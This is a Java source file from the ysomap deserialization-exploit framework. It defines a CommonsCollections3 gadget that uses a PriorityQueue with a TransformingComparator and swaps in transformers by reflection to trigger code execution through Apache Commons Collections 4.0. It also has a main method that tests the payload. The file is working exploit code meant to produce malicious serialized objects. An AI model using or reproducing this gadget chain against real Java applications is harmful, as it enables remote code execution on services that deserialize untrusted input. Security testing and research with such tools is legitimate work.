package ysomap.gadget.payload.collections;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import ysomap.exception.GenerateErrorException;
import ysomap.runner.PayloadTester;
import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.gadget.ObjectGadget;
import ysomap.gadget.bullet.collections.TransformerWithTemplatesImplBullet;
import ysomap.util.Reflections;

import java.util.PriorityQueue;
import java.util.Queue;

/**
 * @author wh1t3P1g
 * @since 2020/2/18
 */
@SuppressWarnings({"rawtypes","unchecked"})
@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({ Authors.FROHOFF })
public class CommonsCollections3 extends CommonsCollections2 {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof Transformer[];
    }

    @Override
    public Queue<Object> pack(Object obj) throws Exception {
        Transformer transformerChain = new ChainedTransformer(
                new ConstantTransformer(1));

        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(transformerChain));
        queue.add(1);
        queue.add(1);
        Reflections.setFieldValue(transformerChain, "iTransformers", obj);
        return queue;
    }

    @Override
    public ObjectGadget getDefaultBullet(String command) {
        return new TransformerWithTemplatesImplBullet(null, "4");
    }

    public static void main(String[] args) throws GenerateErrorException {
        ObjectGadget bullet = new TransformerWithTemplatesImplBullet(null, "4");
        new PayloadTester(CommonsCollections3.class)
                .setBullet(bullet)
                .run();
    }
}
